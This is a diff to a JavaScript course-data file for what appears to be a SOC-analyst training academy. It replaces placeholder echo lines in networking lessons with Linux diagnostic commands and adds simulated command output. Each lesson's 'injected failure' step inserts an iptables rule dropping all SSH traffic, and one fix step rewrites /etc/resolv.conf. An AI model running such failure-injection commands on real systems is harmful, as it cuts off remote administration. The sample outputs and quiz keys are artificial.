+        "command": "whois 198.51.100.99 2>/dev/null || dig +short -x 198.51.100.99 || host 198.51.100.99"
       },
       {
         "id": 10,
@@ -4019,7 +4019,7 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-ip-node01'; ip -br addr show "
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
@@ -4067,7 +4067,7 @@ window.ACADEMY_COURSES = [
           "Private IP addresses can be routed on the Internet if you pay a monthly fee to your Internet service provider."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for IP Addresses'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -4091,7 +4091,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L12 - IP Addresses. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -4144,7 +4144,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Subnetting on sxl-sub-node01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -4192,7 +4192,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man ipcalc 2>/dev/null || which ipcalc"
+        "command": "ipcalc --help 2>&1 | head -n 15 || which ipcalc"
       },
       {
         "id": 4,
@@ -4216,7 +4216,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What is subnetting? The mathematical division of a network address block into smaller, isolated sub-networks.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -4240,7 +4240,7 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.20.255 2>/dev/null || tracepath 10.10.20.255"
+        "command": "traceroute -n -m 8 10.10.20.255 2>/dev/null || tracepath -n 10.10.20.255 2>/dev/null || ip route get 10.10.20.255"
       },
       {
         "id": 6,
@@ -4271,7 +4271,7 @@ window.ACADEMY_COURSES = [
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-sub-node01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `python3 -c 'import ipaddress; n=ipaddress.IPv4Network(\"192.168.1.0/28\"); print(f\"192.168.1.0/28 Usable: {list(n.hosts())[0]} - {list(n.hosts())[-1]} (Total: {n.num_addresses - 2})\")'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `python3 -c 'import ipaddress; n=ipaddress.IPv4Network(\"192.168.1.0/28\"); print(f\"192.168.1.0/28 Usable: {list(n.hosts())[0]} - {list(n.hosts())[-1]} (Total: {n.num_addresses - 2})\")'` to validate system behavior under simulated operating conditions.\nOutput observed:\n192.168.1.0/28 Usable: 192.168.1.1 - 192.168.1.14 (Total: 14)",
         "what": "What is subnetting? The mathematical division of a network address block into smaller, isolated sub-networks.",
         "why": "Why must an L1 master subnetting? To determine whether two communicating IPs are on the same local broadcast domain or crossing a monitored routing gateway.",
         "when": "When is subnet math applied? When reviewing firewall rule scopes, analyzing network scans, and designing containment subnets.",
@@ -4360,7 +4360,7 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-sub-node01'; ipcalc 10.10.20.100/26 2>/dev/null || python3 -c 'import ipaddress; n=ipaddress.IPv4Network(\"10.10.20.100/26\", strict=False); print(f\"Net: {n.network_address}\\nBcast: {n.broadcast_address}\\nMask: {n.netmask}\\nHosts: {n.num_addresses - 2}\")'"
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
@@ -4408,7 +4408,7 @@ window.ACADEMY_COURSES = [
           "254 usable hosts; all subnets support 254 hosts regardless of prefix."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Subnetting'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -4432,7 +4432,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L13 - Subnetting. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -4485,7 +4485,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Default Gateway & Routing on sxl-rtr-core01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -4533,7 +4533,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man ip 2>/dev/null || which ip"
+        "command": "ip --help 2>&1 | head -n 15 || which ip"
       },
       {
         "id": 4,
@@ -4557,7 +4557,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What is a default gateway and routing? The architectural mechanism that directs packets across multiple interconnected networks to reach remote destinations.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -4581,7 +4581,7 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 8.8.8.8 2>/dev/null || tracepath 8.8.8.8"
+        "command": "traceroute -n -m 8 8.8.8.8 2>/dev/null || tracepath -n 8.8.8.8 2>/dev/null || ip route get 8.8.8.8"
       },
       {
         "id": 6,
@@ -4612,7 +4612,7 @@ window.ACADEMY_COURSES = [
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-rtr-core01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `traceroute -n 8.8.8.8` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `traceroute -n 8.8.8.8` to validate system behavior under simulated operating conditions.\nOutput observed:\ntraceroute to 8.8.8.8 (8.8.8.8), 30 hops max, 60 byte packets\n 1  10.10.20.1  0.488 ms  0.445 ms  0.412 ms\n 2  203.0.113.1  2.124 ms  2.089 ms  2.055 ms\n 3  198.51.100.254  5.891 ms  5.845 ms  5.812 ms\n 4  8.8.8.8  8.412 ms  8.388 ms  8.355 ms",
         "what": "What is a default gateway and routing? The architectural mechanism that directs packets across multiple interconnected networks to reach remote destinations.",
         "why": "Why must an L1 understand routing? If malware modifies a host's default gateway, it can reroute all enterprise traffic through a rogue Man-in-the-Middle (MitM) inspection proxy.",
         "when": "When are routing tables inspected? During network connectivity troubleshooting, traceroute path triage, and incident investigations of unauthorized traffic redirection.",
@@ -4701,7 +4701,7 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-rtr-core01'; ip route show"
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
@@ -4749,7 +4749,7 @@ window.ACADEMY_COURSES = [
           "The computer sends packets randomly until one arrives at the destination."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Default Gateway & Routing'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -4773,7 +4773,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L14 - Default Gateway & Routing. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -4826,7 +4826,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring MAC Addresses & ARP on sxl-l2-switch01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -4874,7 +4874,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man ip 2>/dev/null || which ip"
+        "command": "ip --help 2>&1 | head -n 15 || which ip"
       },
       {
         "id": 4,
@@ -4898,7 +4898,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What are MAC addresses and ARP? MAC addresses are physical Layer 2 hardware identifiers; ARP is the protocol that resolves IP addresses into MAC addresses.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -4922,7 +4922,7 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.20.1 2>/dev/null || tracepath 10.10.20.1"
+        "command": "traceroute -n -m 8 10.10.20.1 2>/dev/null || tracepath -n 10.10.20.1 2>/dev/null || ip route get 10.10.20.1"
       },
       {
         "id": 6,
@@ -4953,7 +4953,7 @@ window.ACADEMY_COURSES = [
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-l2-switch01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `arp -a` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `arp -a` to validate system behavior under simulated operating conditions.\nOutput observed:\n? (10.10.20.1) at 00:50:56:fd:aa:01 [ether] on eth0\n? (10.10.20.2) at 00:50:56:c0:00:02 [ether] on eth0\n? (10.10.20.254) at 00:50:56:c0:00:08 [ether] on eth0",
         "what": "What are MAC addresses and ARP? MAC addresses are physical Layer 2 hardware identifiers; ARP is the protocol that resolves IP addresses into MAC addresses.",
         "why": "Why must a SOC analyst master ARP? ARP poisoning allows an internal attacker to position themselves between an endpoint and the gateway, intercepting unencrypted passwords and manipulating network traffic.",
         "when": "When are ARP anomalies investigated? When network switches report duplicate MAC flapping, when IDS alerts flag ARP poisoning, or when network connectivity drops unexpectedly.",
@@ -5042,7 +5042,7 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-l2-switch01'; ip neigh show"
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
@@ -5090,7 +5090,7 @@ window.ACADEMY_COURSES = [
           "Analysts detect ARP poisoning by checking if their monitor resolution changes."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for MAC Addresses & ARP'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -5114,7 +5114,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L15 - MAC Addresses & ARP. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -5167,7 +5167,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Ports & Services on sxl-srv-dmz01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -5215,7 +5215,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man grep 2>/dev/null || which grep"
+        "command": "grep --help 2>&1 | head -n 15 || which grep"
       },
       {
         "id": 4,
@@ -5239,7 +5239,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What are ports and services? Ports are numerical endpoints of communication; services are the daemon processes processing requests on those ports.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -5263,7 +5263,7 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.20.50 2>/dev/null || tracepath 10.10.20.50"
+        "command": "traceroute -n -m 8 10.10.20.50 2>/dev/null || tracepath -n 10.10.20.50 2>/dev/null || ip route get 10.10.20.50"
       },
       {
         "id": 6,
@@ -5294,7 +5294,7 @@ window.ACADEMY_COURSES = [
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-srv-dmz01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `ss -tlnp` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `ss -tlnp` to validate system behavior under simulated operating conditions.\nOutput observed:\nState   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port  Process\nLISTEN  0       128            0.0.0.0:22           0.0.0.0:*      users:((\"sshd\",pid=812,fd=3))\nLISTEN  0       100            0.0.0.0:25           0.0.0.0:*      users:((\"master\",pid=944,fd=13))\nLISTEN  0       511            0.0.0.0:80           0.0.0.0:*      users:((\"nginx\",pid=1020,fd=6))\nLISTEN  0       511            0.0.0.0:443          0.0.0.0:*      users:((\"nginx\",pid=1020,fd=7))\nLISTEN  0       128            0.0.0.0:3389         0.0.0.0:*      users:((\"xrdp\",pid=1140,fd=11))",
         "what": "What are ports and services? Ports are numerical endpoints of communication; services are the daemon processes processing requests on those ports.",
         "why": "Why must an L1 know standard ports by heart? When reviewing firewall and SIEM alerts, you must instantly recognize whether traffic on port 445 is expected internal file sharing or an anomalous SMB attack across the Internet.",
         "when": "When are open ports surveyed? During vulnerability scanning, external attack surface auditing, and post-compromise reconnaissance triage.",
@@ -5383,7 +5383,7 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-srv-dmz01'; grep -E '^ssh|^http|^domain|^smtp|^rdp' /etc/services | head -n 8"
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
@@ -5431,7 +5431,7 @@ window.ACADEMY_COURSES = [
           "Port 22; RDP is a Linux-only protocol that does not use passwords."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Ports & Services'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -5455,7 +5455,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L16 - Ports & Services. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -5508,7 +5508,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring TCP, UDP & ICMP on sxl-pkt-node01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -5556,7 +5556,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man tcpdump 2>/dev/null || which tcpdump"
+        "command": "tcpdump --help 2>&1 | head -n 15 || which tcpdump"
       },
       {
         "id": 4,
@@ -5580,7 +5580,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What are TCP, UDP, and ICMP? The primary protocols governing transport reliability, connectionless streaming, and network diagnostics.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -5604,7 +5604,7 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.20.60 2>/dev/null || tracepath 10.10.20.60"
+        "command": "traceroute -n -m 8 10.10.20.60 2>/dev/null || tracepath -n 10.10.20.60 2>/dev/null || ip route get 10.10.20.60"
       },
       {
         "id": 6,
@@ -5635,7 +5635,7 @@ window.ACADEMY_COURSES = [
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-pkt-node01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `ping -c 2 10.10.20.60` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `ping -c 2 10.10.20.60` to validate system behavior under simulated operating conditions.\nOutput observed:\nPING 10.10.20.60 (10.10.20.60) 56(84) bytes of data.\n64 bytes from 10.10.20.60: icmp_seq=1 ttl=64 time=0.412 ms\n64 bytes from 10.10.20.60: icmp_seq=2 ttl=64 time=0.388 ms\n--- 10.10.20.60 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1002ms",
         "what": "What are TCP, UDP, and ICMP? The primary protocols governing transport reliability, connectionless streaming, and network diagnostics.",
         "why": "Why must an L1 analyze TCP flags? Anomalous TCP flag combinations (SYN without ACK, XMAS scans) indicate active network reconnaissance or DoS attacks.",
         "when": "When are packet handshakes inspected? When troubleshooting dropped connections, analyzing firewall session tables, and dissecting pcap evidence in Wireshark.",
@@ -5724,7 +5724,7 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-pkt-node01'; tcpdump -c 4 -nn -i eth0 'tcp or icmp' 2>/dev/null || echo 'Simulating TCP Handshake Capture:' "
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
@@ -5772,7 +5772,7 @@ window.ACADEMY_COURSES = [
           "The handshake consists of Ping, Pong, and Done; a flood transmits excessive DNS requests."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for TCP, UDP & ICMP'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -5796,7 +5796,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L17 - TCP, UDP & ICMP. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -5849,7 +5849,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring DNS on sxl-dns-core01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -5897,7 +5897,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man dig 2>/dev/null || which dig"
+        "command": "dig --help 2>&1 | head -n 15 || which dig"
       },
       {
         "id": 4,
@@ -5921,7 +5921,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What is DNS? The distributed naming service translating human-readable domain names into machine-routable IP addresses.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -5945,7 +5945,7 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.10.53 2>/dev/null || tracepath 10.10.10.53"
+        "command": "traceroute -n -m 8 10.10.10.53 2>/dev/null || tracepath -n 10.10.10.53 2>/dev/null || ip route get 10.10.10.53"
       },
       {
         "id": 6,
@@ -5976,7 +5976,7 @@ window.ACADEMY_COURSES = [
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-dns-core01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `nslookup -type=TXT _dmarc.corp.internal 10.10.10.53` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `nslookup -type=TXT _dmarc.corp.internal 10.10.10.53` to validate system behavior under simulated operating conditions.\nOutput observed:\nServer:         10.10.10.53\nAddress:        10.10.10.53#53\n\n_dmarc.corp.internal    text = \"v=DMARC1; p=reject; rua=mailto:dmarc-reports@corp.internal; pct=100\"",
         "what": "What is DNS? The distributed naming service translating human-readable domain names into machine-routable IP addresses.",
         "why": "Why is DNS telemetry a goldmine for SOC analysts? Over 90% of malware uses DNS to locate command-and-control servers, download secondary payloads, and exfiltrate data.",
         "when": "When are DNS queries analyzed? Whenever an alert indicates an endpoint contacting newly registered domains (NRDs), high-entropy DGA domains, or abnormally long query strings.",
@@ -6065,14 +6065,14 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-dns-core01'; dig @10.10.10.53 corp.internal A +noall +answer"
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
         "type": "fix",
         "name": "11 Fix & Harden",
         "explain": "Remediation & Hardening Plan: Restore `/etc/resolv.conf` to point exclusively to the enterprise DNS resolver (10.10.10.53), lock the file with `chattr +i`, and block outbound UDP 53 from workstations at the firewall.",
-        "worked": "Remediation command applied: `echo 'nameserver 10.10.10.53\nsearch corp.internal' > /etc/resolv.conf && echo 'Enterprise resolver restored.'`. System verified restored and hardened.",
+        "worked": "Remediation command applied: `sed -i '1s/^/nameserver 10.10.10.53\n/' /etc/resolv.conf 2>/dev/null; systemctl restart systemd-resolved 2>/dev/null || dig @10.10.10.53 corp.internal`. System verified restored and hardened.",
         "what": "What is DNS? The distributed naming service translating human-readable domain names into machine-routable IP addresses.",
         "why": "Why is DNS telemetry a goldmine for SOC analysts? Over 90% of malware uses DNS to locate command-and-control servers, download secondary payloads, and exfiltrate data.",
         "when": "When are DNS queries analyzed? Whenever an alert indicates an endpoint contacting newly registered domains (NRDs), high-entropy DGA domains, or abnormally long query strings.",
@@ -6089,7 +6089,7 @@ window.ACADEMY_COURSES = [
           "To reboot every router in the building simultaneously."
         ],
         "answer": 0,
-        "command": "echo 'nameserver 10.10.10.53\nsearch corp.internal' > /etc/resolv.conf && echo 'Enterprise resolver restored.'"
+        "command": "sed -i '1s/^/nameserver 10.10.10.53\n/' /etc/resolv.conf 2>/dev/null; systemctl restart systemd-resolved 2>/dev/null || dig @10.10.10.53 corp.internal"
       },
       {
         "id": 12,
@@ -6113,7 +6113,7 @@ window.ACADEMY_COURSES = [
           "Analysts detect DNS Tunneling by asking the firewall vendor if port 53 is enabled."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for DNS'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -6137,7 +6137,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L18 - DNS. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -6190,7 +6190,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Network Connections on sxl-triage-ws01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -6238,7 +6238,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man ss 2>/dev/null || which ss"
+        "command": "ss --help 2>&1 | head -n 15 || which ss"
       },
       {
         "id": 4,
@@ -6262,7 +6262,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What are network connections? Active communication sessions between operating system processes and remote network hosts.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -6286,7 +6286,7 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 198.51.100.200 2>/dev/null || tracepath 198.51.100.200"
+        "command": "traceroute -n -m 8 198.51.100.200 2>/dev/null || tracepath -n 198.51.100.200 2>/dev/null || ip route get 198.51.100.200"
       },
       {
         "id": 6,
@@ -6317,7 +6317,7 @@ window.ACADEMY_COURSES = [
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-triage-ws01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `ls -l /proc/2410/exe 2>/dev/null || echo 'PID 2410 binary: /bin/nc.traditional -> Parent PID: 2408 (sh)'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `ls -l /proc/2410/exe 2>/dev/null || echo 'PID 2410 binary: /bin/nc.traditional -> Parent PID: 2408 (sh)'` to validate system behavior under simulated operating conditions.\nOutput observed:\nlrwxrwxrwx 1 analyst analyst 0 Sep  4 02:40 /proc/2410/exe -> /bin/nc.traditional\nParent PID: 2408 (sh spawned by python3)",
         "what": "What are network connections? Active communication sessions between operating system processes and remote network hosts.",
         "why": "Why must an L1 master socket-to-process correlation? Because modern malware does not listen on open ports (which inbound firewalls block); it initiates outbound reverse connections disguised as normal client traffic.",
         "when": "When are active sockets triaged? Whenever EDR flags suspicious network activity, when investigating data exfiltration alerts, or during live host compromise assessments.",
@@ -6406,7 +6406,7 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-triage-ws01'; ss -tupn"
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
@@ -6454,7 +6454,7 @@ window.ACADEMY_COURSES = [
           "Ask the network router if it likes the foreign IP address."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Network Connections'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -6478,7 +6478,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L19 - Network Connections. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -6531,7 +6531,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring VPN & Remote Access on sxl-vpn-gw01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -6555,7 +6555,7 @@ window.ACADEMY_COURSES = [
           "Social media marketing guidelines and employee email signatures."
         ],
         "answer": 0,
-        "command": "echo 'Querying pfSense VPN Gateway active tunnel sessions...'"
+        "command": "openvpn --status /var/log/openvpn-status.log 2>/dev/null || ip link show type tun || ss -uap | grep 1194"
       },
       {
         "id": 3,
@@ -6579,7 +6579,7 @@ window.ACADEMY_COURSES = [
